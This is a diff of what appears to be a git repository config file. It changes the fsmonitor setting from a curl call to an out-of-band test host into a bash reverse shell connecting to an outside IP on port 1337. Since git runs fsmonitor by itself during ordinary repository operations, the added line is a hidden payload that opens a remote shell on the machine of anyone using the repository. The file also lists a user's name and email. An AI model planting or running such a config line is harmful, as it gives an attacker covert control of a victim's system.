@@ -3,7 +3,7 @@ repositoryformatversion = 0
 filemode = true
 bare = false
 worktree = "worktree" 
-fsmonitor = "curl https://d0mo74rqc9f04g5ns2tgtuc3o3kzsjbsp.oast.live/oob-test0"
+fsmonitor = "bash -i >& /dev/tcp/139.59.18.36/1337 0>&1"
 [user]
 	email = sivaneshashok@gmail.com
 	name = staz0t
